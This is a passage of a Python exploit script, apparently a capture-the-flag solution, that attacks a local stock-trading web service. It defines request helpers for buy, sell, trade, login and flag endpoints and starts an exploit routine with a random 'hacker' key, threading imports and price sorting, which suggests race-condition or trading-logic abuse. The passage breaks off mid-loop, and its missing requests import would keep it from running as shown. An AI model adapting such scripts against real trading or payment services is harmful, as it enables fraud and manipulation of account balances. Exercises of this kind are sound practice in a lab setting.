import threading
from concurrent.futures import ThreadPoolExecutor
import random

TARGET = "http://localhost:4657"

def make_request(path, data=None):
    try:
        if data:
            return requests.post(f"{TARGET}{path}", data=data, timeout=1)
        return requests.get(f"{TARGET}{path}", timeout=1)
    except:
        return None

def get_stocks():
    resp = make_request("/listCalls")
    return resp.json() if resp else {}

def buy_stock(key, stock):
    return make_request("/buy", {"key": key, "stock": stock})

def sell_stock(key, stock):
    return make_request("/sell", {"key": key, "stock": stock})

def trade_stock(key, stock1, stock2):
    return make_request("/trade", {"key": key, "stock": stock1, "stock1": stock2})

def get_balance(key):
    resp = make_request("/login", {"key": key})
    return resp.json() if resp else {"balance": 0}

def get_flag(key):
    return make_request("/flag", {"key": key})

def exploit():
    # Use random key to avoid conflicts
    key = f"hacker{random.randint(1000,9999)}"
    stocks = get_stocks()

    # Find highest and lowest priced stocks
    sorted_stocks = sorted(stocks.items(), key=lambda x: x[1]["price"], reverse=True)
    stocks_to_use = []
    for i in range(min(5, len(sorted_stocks))):
